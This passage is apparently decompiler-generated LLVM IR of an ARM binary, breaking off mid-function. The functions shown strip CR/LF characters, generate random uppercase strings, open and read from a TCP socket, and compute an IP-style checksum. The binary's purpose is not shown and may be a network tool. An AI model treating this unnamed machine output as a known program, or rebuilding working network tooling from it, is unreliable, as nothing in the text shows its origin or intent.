  %v1_8664 = add i32 %arg1, -1
  br label %dec_label_pc_8660

dec_label_pc_8640:                                ; preds = %dec_label_pc_8684, %dec_label_pc_8660
  store i32 %arg1, i32* @r0, align 4
  %v0_864c = call i32 @function_f670()
  %v2_8654 = add i32 %v1_8664, %v0_864c
  %v3_865c = inttoptr i32 %v2_8654 to i8*
  store i8 0, i8* %v3_865c, align 1
  br label %dec_label_pc_8660

dec_label_pc_8660:                                ; preds = %dec_label_pc_8628, %dec_label_pc_8640
  store i32 %arg1, i32* @r0, align 4
  %v0_866c = call i32 @function_f670()
  %v2_8674 = add i32 %v1_8664, %v0_866c
  %v1_8678 = inttoptr i32 %v2_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 13
  br i1 %v7_867c, label %dec_label_pc_8640, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_8660
  store i32 %arg1, i32* @r0, align 4
  %v0_8690 = call i32 @function_f670()
  %v2_8698 = add i32 %v1_8664, %v0_8690
  %v1_869c = inttoptr i32 %v2_8698 to i8*
  %v2_869c = load i8, i8* %v1_869c, align 1
  %v7_86a0 = icmp eq i8 %v2_869c, 10
  br i1 %v7_86a0, label %dec_label_pc_8640, label %dec_label_pc_86a8

dec_label_pc_86a8:                                ; preds = %dec_label_pc_8684
  ret i32 %v0_8690

; uselistorder directives
  uselistorder i32 %v1_8664, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8660, { 1, 0 }
}

define i32 @function_86b4() local_unnamed_addr {
dec_label_pc_86b4:
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_86b8 = load i32, i32* @r4, align 4
  %v6_86b8 = load i32, i32* @fp, align 4
  store i32 34496, i32* %stack_var_-4, align 4
  %v2_86bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_86bc, i32* @fp, align 4
  %v0_86c8 = call i32 @function_113ec()
  %v2_86e0 = srem i32 %v0_86c8, 5
  %v1_8704 = add nsw i32 %v2_86e0, 4
  %v1_8710 = add nsw i32 %v2_86e0, 5
  %v1_8718 = call i32 @function_10110(i32 %v1_8710)
  store i32 %v1_8710, i32* @r2, align 4
  %v2_8738 = inttoptr i32 %v1_8718 to i8*
  %v3_8738 = call i32 @function_f5d0(i8* %v2_8738, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_188c0.23 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32), i32* @r1, align 4
  %v3_8744 = call i32 @function_d2bc(i32 ptrtoint ([16 x i8]* @global_var_188c0.23 to i32), i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32))
  %v2_8754 = icmp eq i32 %v3_8744, 0
  br i1 %v2_8754, label %dec_label_pc_87dc.preheader, label %dec_label_pc_87f0

dec_label_pc_87dc.preheader:                      ; preds = %dec_label_pc_86b4
  %v2_87e424 = sub nsw i32 -4, %v2_86e0
  %v6_87e426 = and i32 %v2_87e424, %v1_8704
  %v7_87e427 = icmp slt i32 %v6_87e426, 0
  %v8_87e428 = icmp slt i32 %v2_87e424, 0
  %v2_87e830 = xor i1 %v8_87e428, %v7_87e427
  br i1 %v2_87e830, label %dec_label_pc_8768, label %dec_label_pc_891c

dec_label_pc_8768:                                ; preds = %dec_label_pc_87dc.preheader, %dec_label_pc_8768
  %storemerge331 = phi i32 [ %v1_87d4, %dec_label_pc_8768 ], [ 0, %dec_label_pc_87dc.preheader ]
  %v2_8774 = add i32 %storemerge331, %v1_8718
  store i32 %v2_8774, i32* @r4, align 4
  %v0_8778 = call i32 @function_113ec()
  %v2_8790 = srem i32 %v0_8778, 26
  %fold = add nsw i32 %v2_8790, 65
  %v1_87cc = trunc i32 %fold to i8
  %v2_87cc = load i32, i32* @r4, align 4
  %v3_87cc = inttoptr i32 %v2_87cc to i8*
  store i8 %v1_87cc, i8* %v3_87cc, align 1
  %v1_87d4 = add i32 %storemerge331, 1
  %v2_87e4 = sub i32 %v1_87d4, %v1_8704
  %v4_87e4 = xor i32 %v1_87d4, %v1_8704
  %v5_87e4 = xor i32 %v2_87e4, %v1_87d4
  %v6_87e4 = and i32 %v5_87e4, %v4_87e4
  %v7_87e4 = icmp slt i32 %v6_87e4, 0
  %v8_87e4 = icmp slt i32 %v2_87e4, 0
  %v2_87e8 = xor i1 %v8_87e4, %v7_87e4
  br i1 %v2_87e8, label %dec_label_pc_8768, label %dec_label_pc_891c

dec_label_pc_87f0:                                ; preds = %dec_label_pc_86b4
  %v0_87f0 = call i32 @function_113ec()
  store i32 %v0_87f0, i32* @r4, align 4
  %v0_87f8 = call i32 @function_113ec()
  %v1_8800 = load i32, i32* @r4, align 4
  %v2_8800 = mul i32 %v1_8800, %v0_87f8
  %v2_8818 = sdiv i32 %v2_8800, 12039
  %tmp23 = mul i32 %v2_8818, -45402
  %v2_8854 = add i32 %tmp23, %v2_8800
  %v1_8860 = add i32 %v2_8854, 1
  %v2_887c = ptrtoint i32* %stack_var_-1068 to i32
  br label %dec_label_pc_889c

dec_label_pc_8874:                                ; preds = %dec_label_pc_889c
  %v3_888c = call i32 @function_ed48(i32 %v2_887c, i32 1024, i32 %v3_8744)
  %v1_8894 = add i32 %storemerge2, 1
  br label %dec_label_pc_889c

dec_label_pc_889c:                                ; preds = %dec_label_pc_87f0, %dec_label_pc_8874
  %storemerge2 = phi i32 [ 0, %dec_label_pc_87f0 ], [ %v1_8894, %dec_label_pc_8874 ]
  %v2_88a4 = sub i32 %storemerge2, %v1_8860
  %v4_88a4 = xor i32 %storemerge2, %v1_8860
  %v5_88a4 = xor i32 %v2_88a4, %storemerge2
  %v6_88a4 = and i32 %v5_88a4, %v4_88a4
  %v7_88a4 = icmp slt i32 %v6_88a4, 0
  %v8_88a4 = icmp slt i32 %v2_88a4, 0
  %v2_88a8 = xor i1 %v8_88a4, %v7_88a4
  br i1 %v2_88a8, label %dec_label_pc_8874, label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_889c
  store i32 1024, i32* @r2, align 4
  %v2_88c4 = bitcast i32* %stack_var_-1068 to i8*
  %v3_88c4 = call i32 @function_f5d0(i8* %v2_88c4, i32 0)
  %v3_88e0 = call i32 @function_ed48(i32 %v2_887c, i32 1024, i32 %v3_8744)
  %v1_88f4 = call i32 @function_8628(i32 %v2_887c)
  store i32 %v1_8704, i32* @r2, align 4
  store i32 %v2_887c, i32* @r3, align 4
  store i32 %v1_8718, i32* @r0, align 4
  store i32 %v2_887c, i32* @r1, align 4
  %v0_8910 = call i32 @function_f700()
  %v1_8918 = inttoptr i32 %v3_8744 to i16*
  %v2_8918 = call i32 @function_d108(i16* %v1_8918)
  br label %dec_label_pc_891c

dec_label_pc_891c:                                ; preds = %dec_label_pc_87dc.preheader, %dec_label_pc_8768, %dec_label_pc_88ac
  store i32 %v3_86b8, i32* @r4, align 4
  store i32 %v6_86b8, i32* @fp, align 4
  ret i32 %v1_8718

; uselistorder directives
  uselistorder i32 %v2_88a4, { 1, 0 }
  uselistorder i32 %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8800, { 1, 0 }
  uselistorder i32 %v2_87e4, { 1, 0 }
  uselistorder i32 %v1_87d4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_87e424, { 1, 0 }
  uselistorder i32 %v1_8718, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8704, { 2, 1, 3, 0 }
  uselistorder i32 %v2_86e0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_891c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_889c, { 1, 0 }
  uselistorder label %dec_label_pc_8768, { 1, 0 }
}

define i32 @function_8930(i32 %arg1, i64* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8930:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8930 = load i1, i1* @cpsr_v, align 1
  br i1 %v0_8930, label %bb, label %bb34

bb:                                               ; preds = %dec_label_pc_8930
  %v1_8930 = load i32, i32* @r6, align 4
  %v2_8930 = trunc i32 %v1_8930 to i8
  %v4_8930 = inttoptr i32 %v1_8930 to i8*
  store i8 %v2_8930, i8* %v4_8930, align 1
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_8930, %bb
  %v0_8934 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8934, label %bb35, label %.thread

bb35:                                             ; preds = %bb34
  %v1_8934 = load i32, i32* %r1.global-to-local, align 4
  %v2_8938 = inttoptr i32 %v1_8934 to i64*
  %v3_8938 = load i64, i64* %v2_8938, align 4
  %v5_8938 = trunc i64 %v3_8938 to i32
  %v6_8938 = udiv i64 %v3_8938, 4294967296
  %v7_8938 = trunc i64 %v6_8938 to i32
  store i32 %v7_8938, i32* @r8, align 4
  store i32 %v5_8938, i32* @sb, align 4
  %v9_8938 = sub i32 %v1_8934, %arg1
  store i32 %v9_8938, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb34, %bb35
  %v0_8940 = load i1, i1* @cpsr_n, align 1
  %v1_8940 = load i1, i1* @cpsr_v, align 1
  %v2_8940 = xor i1 %v0_8940, %v1_8940
  br i1 %v2_8940, label %bb36, label %bb37

bb36:                                             ; preds = %.thread
  %v4_8940 = inttoptr i32 %arg3 to i32*
  store i32 %arg1, i32* %v4_8940, align 4
  %v6_8940 = add i32 %arg3, 4
  %v7_8940 = inttoptr i32 %v6_8940 to i32*
  %v8_8940 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_8940, i32* %v7_8940, align 4
  %v9_8940 = add i32 %arg3, 8
  %v10_8940 = inttoptr i32 %v9_8940 to i32*
  store i32 %arg3, i32* %v10_8940, align 4
  %v12_8940 = add i32 %arg3, 12
  %v13_8940 = inttoptr i32 %v12_8940 to i32*
  %v14_8940 = load i32, i32* @r4, align 4
  store i32 %v14_8940, i32* %v13_8940, align 4
  %v15_8940 = add i32 %arg3, 16
  %v16_8940 = inttoptr i32 %v15_8940 to i32*
  %v17_8940 = load i32, i32* @r5, align 4
  store i32 %v17_8940, i32* %v16_8940, align 4
  %v18_8940 = add i32 %arg3, 20
  %v19_8940 = inttoptr i32 %v18_8940 to i32*
  %v20_8940 = load i32, i32* @r6, align 4
  store i32 %v20_8940, i32* %v19_8940, align 4
  %v21_8940 = add i32 %arg3, 24
  %v22_8940 = inttoptr i32 %v21_8940 to i32*
  %v23_8940 = load i32, i32* @r8, align 4
  store i32 %v23_8940, i32* %v22_8940, align 4
  %v24_8940 = add i32 %arg3, 28
  %v25_8940 = inttoptr i32 %v24_8940 to i32*
  %v26_8940 = load i32, i32* @ip, align 4
  store i32 %v26_8940, i32* %v25_8940, align 4
  %v27_8940 = add i32 %arg3, 32
  %v28_8940 = inttoptr i32 %v27_8940 to i32*
  %v29_8940 = load i32, i32* @lr, align 4
  store i32 %v29_8940, i32* %v28_8940, align 4
  br label %bb37

bb37:                                             ; preds = %.thread, %bb36
  %v3_8948 = load i32, i32* @fp, align 4
  store i32 %v3_8948, i32* %stack_var_-16, align 4
  store i32 35152, i32* %stack_var_-4, align 4
  %v13_8948 = ptrtoint i32* %stack_var_-16 to i32
  %v2_894c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_894c, i32* @fp, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8960 = call i32 @function_10044(i32 2, i32 1, i32 0)
  %v7_8970 = icmp eq i32 %v3_8960, -1
  br i1 %v7_8970, label %dec_label_pc_8d00, label %dec_label_pc_8978

dec_label_pc_8978:                                ; preds = %bb37
  store i32 2, i32* %stack_var_-60, align 4
  %v1_8984 = call i32 @function_fc54(i32 113)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 8, i32* @r2, align 4
  %v2_89ac = bitcast i32* %stack_var_-52 to i8*
  %v3_89ac = call i32 @function_f5d0(i8* %v2_89ac, i32 0)
  %v2_89b0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_89b0, i32* %r1.global-to-local, align 4
  %v4_89c0 = call i32 @function_fee4(i32 %v3_8960, i32 %v2_89b0, i32 16, i32 %v2_89b0)
  %v7_89c8 = icmp eq i32 %v4_89c0, -1
  br i1 %v7_89c8, label %dec_label_pc_8d00, label %dec_label_pc_89d0

dec_label_pc_89d0:                                ; preds = %dec_label_pc_8978
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_89d8 = call i32 @function_ff54(i32 %v3_8960, i32 1)
  store i32 %v2_89d8, i32* @r0, align 4
  %v7_89e0 = icmp eq i32 %v2_89d8, -1
  br i1 %v7_89e0, label %dec_label_pc_8d00, label %dec_label_pc_89e8

dec_label_pc_89e8:                                ; preds = %dec_label_pc_89d0
  %v0_89e8 = call i32 @function_cf08()
  %v2_89f0 = icmp eq i32 %v0_89e8, 0
  br i1 %v2_89f0, label %dec_label_pc_8d00, label %dec_label_pc_89f8

dec_label_pc_89f8:                                ; preds = %dec_label_pc_89e8
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8a00 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8a04 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8a00, i32* %r1.global-to-local, align 4
  %v5_8a10 = call i32 @function_feac(i32 %v3_8960, i32 %v2_8a00, i32 %v2_8a04, i32 %v2_8a00, i32 16)
  %v2_8a20 = add i32 %v5_8a10, 1
  %v3_8a20 = icmp eq i32 %v5_8a10, -1
  br i1 %v3_8a20, label %dec_label_pc_8a28, label %dec_label_pc_8a30.preheader

dec_label_pc_8a28:                                ; preds = %dec_label_pc_89f8
  %v1_8a2c = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8a30.preheader

dec_label_pc_8a30.preheader:                      ; preds = %dec_label_pc_8a28, %dec_label_pc_89f8
  %v2_8a38 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8a78 = udiv i32 %v5_8a10, 32
  %v3_8a8c = mul nuw nsw i32 %v3_8a78, 4
  %v2_8a94 = add i32 %v3_8a8c, %v13_8948
  %v1_8aa4 = urem i32 %v5_8a10, 32
  %v6_8aac = shl i32 1, %v1_8aa4
  %v2_8afc = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8b48 = add i32 %v2_8a94, -1220
  %v1_8b4c = inttoptr i32 %v2_8b48 to i32*
  br label %dec_label_pc_8a4c.lr.ph

dec_label_pc_8a4c.lr.ph:                          ; preds = %dec_label_pc_8b2c, %dec_label_pc_8a30.preheader
  br label %dec_label_pc_8a4c

dec_label_pc_8a4c:                                ; preds = %dec_label_pc_8a4c.lr.ph, %dec_label_pc_8a4c
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8a4c.lr.ph ], [ %v1_8a60, %dec_label_pc_8a4c ]
  store i32 %storemerge26, i32* %r1.global-to-local, align 4
  %v5_8a58 = mul nuw nsw i32 %storemerge26, 4
  %v6_8a58 = add i32 %v5_8a58, %v2_8a38
  %v7_8a58 = inttoptr i32 %v6_8a58 to i32*
  store i32 0, i32* %v7_8a58, align 4
  %v1_8a60 = add nuw nsw i32 %storemerge26, 1
  %tmp38 = icmp ult i32 %v1_8a60, 32
  br i1 %tmp38, label %dec_label_pc_8a4c, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a4c
  store i32 %v13_8948, i32* %r1.global-to-local, align 4
  %v2_8a9c = load i32, i32* %v1_8b4c, align 4
  %v2_8ab0 = or i32 %v2_8a9c, %v6_8aac
  store i32 %v2_8ab0, i32* %v1_8b4c, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  store i32 %v2_8a38, i32* %r1.global-to-local, align 4
  %v5_8b14 = call i32 @function_cf58(i32 %v2_8a20, i32 %v2_8a38, i32 0, i32 0, i32 %v2_8afc)
  %v1_8b1c = icmp slt i32 %v5_8b14, 0
  br i1 %v1_8b1c, label %dec_label_pc_8b24, label %dec_label_pc_8b2c

dec_label_pc_8b24:                                ; preds = %dec_label_pc_8a74
  %v1_8b28 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8b2c

dec_label_pc_8b2c:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8b24
  store i32 %v13_8948, i32* %r1.global-to-local, align 4
  %v2_8b4c = load i32, i32* %v1_8b4c, align 4
  %v6_8b581 = lshr i32 %v2_8b4c, %v1_8aa4
  %v1_8b60 = urem i32 %v6_8b581, 2
  %v2_8b64 = icmp eq i32 %v1_8b60, 0
  br i1 %v2_8b64, label %dec_label_pc_8a4c.lr.ph, label %dec_label_pc_8b70

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b2c
  %v2_8b78 = ptrtoint i32* %stack_var_-1100 to i32
  store i32 %v2_8b78, i32* %r1.global-to-local, align 4
  %v4_8b8c = call i32 @function_ff88(i32 %v5_8a10, i32 %v2_8b78, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v4_8b8c, 1
  br i1 %tmp39, label %dec_label_pc_8bb0, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b70
  %v7_8bac = icmp slt i32 %v4_8b8c, 20
  br i1 %v7_8bac, label %dec_label_pc_8bb8, label %dec_label_pc_8bb0

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba4, %dec_label_pc_8b70
  %v1_8bb4 = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8bb8

dec_label_pc_8bb8:                                ; preds = %dec_label_pc_8ba4, %dec_label_pc_8bb0
  %v2_8bc8 = add i32 %v13_8948, -1084
  %v2_8bcc = add i32 %v2_8bc8, %v4_8b8c
  %v3_8bd4 = inttoptr i32 %v2_8bcc to i8*
  store i8 0, i8* %v3_8bd4, align 1
  store i32 %v13_8948, i32* %r1.global-to-local, align 4
  %v1_8bdc = add i32 %v13_8948, -1
  %v2_8bec = add i32 %v1_8bdc, %v4_8b8c
  %v2_8bf0 = add i32 %v2_8bec, -1084
  %v1_8bf4 = inttoptr i32 %v2_8bf0 to i8*
  %v2_8bf4 = load i8, i8* %v1_8bf4, align 1
  %v7_8bf8 = icmp eq i8 %v2_8bf4, 10
  br i1 %v7_8bf8, label %dec_label_pc_8c28, label %dec_label_pc_8c00

dec_label_pc_8c00:                                ; preds = %dec_label_pc_8bb8
  %v2_8c1c = load i8, i8* %v1_8bf4, align 1
  %v7_8c20 = icmp eq i8 %v2_8c1c, 13
  br i1 %v7_8c20, label %dec_label_pc_8c28, label %dec_label_pc_8c4c

dec_label_pc_8c28:                                ; preds = %dec_label_pc_8c00, %dec_label_pc_8bb8
  store i32 %v13_8948, i32* %r1.global-to-local, align 4
  store i8 0, i8* %v1_8bf4, align 1
  br label %dec_label_pc_8c4c

dec_label_pc_8c4c:                                ; preds = %dec_label_pc_8c00, %dec_label_pc_8c28
  %v1_8c50 = add i32 %v13_8948, -2
  %v2_8c60 = add i32 %v1_8c50, %v4_8b8c
  %v2_8c64 = add i32 %v2_8c60, -1084
  %v1_8c68 = inttoptr i32 %v2_8c64 to i8*
  %v2_8c68 = load i8, i8* %v1_8c68, align 1
  %v7_8c6c = icmp eq i8 %v2_8c68, 10
  br i1 %v7_8c6c, label %dec_label_pc_8c9c, label %dec_label_pc_8c74

dec_label_pc_8c74:                                ; preds = %dec_label_pc_8c4c
  store i32 %v13_8948, i32* %r1.global-to-local, align 4
  %v2_8c90 = load i8, i8* %v1_8c68, align 1
  %v7_8c94 = icmp eq i8 %v2_8c90, 13
  br i1 %v7_8c94, label %dec_label_pc_8c9c, label %dec_label_pc_8cc0

dec_label_pc_8c9c:                                ; preds = %dec_label_pc_8c74, %dec_label_pc_8c4c
  store i8 0, i8* %v1_8c68, align 1
  br label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8c74, %dec_label_pc_8c9c
  store i32 ptrtoint ([25 x i8]* @global_var_188d4.31 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8b78, i32* @r2, align 4
  %v3_8ce4 = call i32 @function_8398(i32 %v5_8a10, i32 ptrtoint ([25 x i8]* @global_var_188d4.31 to i32))
  %v1_8cec = call i32 @function_d088(i32 %v5_8a10)
  %v1_8cf4 = call i32 @function_d088(i32 %v3_8960)
  %v1_8cfc = call i32 @function_11bf0(i32 0)
  br label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_89d0, %dec_label_pc_8978, %bb37, %dec_label_pc_8cc0
  %v1_8d08 = phi i32 [ 0, %dec_label_pc_89e8 ], [ %v2_89d8, %dec_label_pc_89d0 ], [ %v4_89c0, %dec_label_pc_8978 ], [ %v3_8960, %bb37 ], [ %v1_8cfc, %dec_label_pc_8cc0 ]
  ret i32 %v1_8d08

; uselistorder directives
  uselistorder i8* %v1_8c68, { 1, 0, 2 }
  uselistorder i8* %v1_8bf4, { 1, 0, 2 }
  uselistorder i32 %v2_8b78, { 0, 2, 1 }
  uselistorder i32 %storemerge26, { 2, 0, 1 }
  uselistorder i32* %v1_8b4c, { 2, 0, 1 }
  uselistorder i32 %v1_8aa4, { 1, 0 }
  uselistorder i32 %v2_8a38, { 2, 1, 0 }
  uselistorder i32 %v5_8a10, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8a00, { 0, 2, 1 }
  uselistorder i32 %v2_89d8, { 1, 0, 2 }
  uselistorder i32 %v4_89c0, { 1, 0 }
  uselistorder i32 %v2_89b0, { 0, 2, 1 }
  uselistorder i32 %v3_8960, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_8948, { 4, 0, 5, 1, 6, 3, 7, 8, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1 }
  uselistorder i32 %arg3, { 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8d00, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8cc0, { 1, 0 }
  uselistorder label %dec_label_pc_8c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8bb8, { 1, 0 }
  uselistorder label %dec_label_pc_8b2c, { 1, 0 }
  uselistorder label %dec_label_pc_8a4c, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
}

define i32 @function_8d14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8d14:
  %stack_var_-4 = alloca i32, align 4
  store i32 36128, i32* %stack_var_-4, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  %v2_8d30 = icmp eq i32 %arg2, 0
  br i1 %v2_8d30, label %dec_label_pc_8d38, label %dec_label_pc_8d44

dec_label_pc_8d38:                                ; preds = %dec_label_pc_8d14
  br label %dec_label_pc_8d80

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d14
  %v7_8d48 = icmp eq i32 %arg2, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d5c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  br label %dec_label_pc_8d80

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8d44
  %v1_8d48 = add i32 %arg2, -1
  %v2_8d6c = call i32 @function_8d14(i32 %arg1, i32 %v1_8d48)
  %v2_8d78 = mul i32 %v2_8d6c, %arg1
  br label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50, %dec_label_pc_8d38, %dec_label_pc_8d5c
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8d38 ], [ %arg1, %dec_label_pc_8d50 ], [ %v2_8d78, %dec_label_pc_8d5c ]
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d80, { 2, 0, 1 }
}

define i32 @function_8d94(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8d94:
  %stack_var_0 = alloca i32, align 4
  %v1_8d94 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8d94, i32* @ip, align 4
  %v8_8e0410 = icmp sgt i32 %arg2, 1
  br i1 %v8_8e0410, label %dec_label_pc_8dd0, label %dec_label_pc_8e08

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8d94, %dec_label_pc_8dd0
  %stack_var_-44.013 = phi i32 [ %v1_8df4, %dec_label_pc_8dd0 ], [ %arg2, %dec_label_pc_8d94 ]
  %stack_var_-36.012 = phi i32 [ %v2_8ddc, %dec_label_pc_8dd0 ], [ 0, %dec_label_pc_8d94 ]
  %stack_var_-40.011 = phi i16* [ %v5_8dec, %dec_label_pc_8dd0 ], [ %arg1, %dec_label_pc_8d94 ]
  %v4_8dd0 = ptrtoint i16* %stack_var_-40.011 to i32
  %v2_8dd4 = load i16, i16* %stack_var_-40.011, align 2
  %v3_8dd4 = zext i16 %v2_8dd4 to i32
  %v2_8ddc = add i32 %v3_8dd4, %stack_var_-36.012
  %v1_8de8 = add i32 %v4_8dd0, 2
  %v5_8dec = inttoptr i32 %v1_8de8 to i16*
  %v1_8df4 = add nsw i32 %stack_var_-44.013, -2
  %v8_8e04 = icmp sgt i32 %v1_8df4, 1
  br i1 %v8_8e04, label %dec_label_pc_8dd0, label %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge

dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge:    ; preds = %dec_label_pc_8dd0
  %v7_8e00.le = icmp eq i32 %v1_8df4, 1
  br i1 %v7_8e00.le, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e08:                                ; preds = %dec_label_pc_8d94
  %v7_8e009 = icmp eq i32 %arg2, 1
  br i1 %v7_8e009, label %dec_label_pc_8e14, label %dec_label_pc_8e34

dec_label_pc_8e14:                                ; preds = %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge, %dec_label_pc_8e08
  %stack_var_-36.0.lcssa29 = phi i32 [ %v2_8ddc, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ], [ 0, %dec_label_pc_8e08 ]
  %stack_var_-40.0.lcssa28 = phi i16* [ %v5_8dec, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ], [ %arg1, %dec_label_pc_8e08 ]
  %v1_8e1c = bitcast i16* %stack_var_-40.0.lcssa28 to i8*
  %v2_8e1c = load i8, i8* %v1_8e1c, align 1
  %v3_8e1c = zext i8 %v2_8e1c to i32
  %v2_8e2c = add i32 %v3_8e1c, %stack_var_-36.0.lcssa29
  br label %dec_label_pc_8e34

dec_label_pc_8e34:                                ; preds = %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge, %dec_label_pc_8e08, %dec_label_pc_8e14
  %stack_var_-36.1 = phi i32 [ %v2_8e2c, %dec_label_pc_8e14 ], [ 0, %dec_label_pc_8e08 ], [ %v2_8ddc, %dec_label_pc_8dfc.dec_label_pc_8e08_crit_edge ]
  %v3_8e38 = sdiv i32 %stack_var_-36.1, 65536
  %v3_8e44 = urem i32 %stack_var_-36.1, 65536
  %v2_8e48 = add nsw i32 %v3_8e38, %v3_8e44
  %v3_8e54 = sdiv i32 %v2_8e48, 65536
  %v2_8e5c = add nsw i32 %v3_8e54, %v2_8e48
  %v1_8e70 = mul i32 %v2_8e5c, 65536
  %sext = xor i32 %v1_8e70, -65536
  %v4_8e80 = sdiv i32 %sext, 65536
  ret i32 %v4_8e80

; uselistorder directives
  uselistorder i32 %v2_8e48, { 1, 0 }
  uselistorder i32 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %v1_8df4, { 0, 2, 1 }
  uselistorder i32 %v2_8ddc, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8e14, { 1, 0 }
  uselistorder label %dec_label_pc_8dd0, { 1, 0 }
}

define i32 @function_8e94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8e94:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-5224 = alloca i32, align 4
  %stack_var_-5204 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36512, i32* %stack_var_-4, align 4
  %v2_8e9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e9c, i32* @fp, align 4
  %v2_8eb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8eb0, i32* @lr, align 4
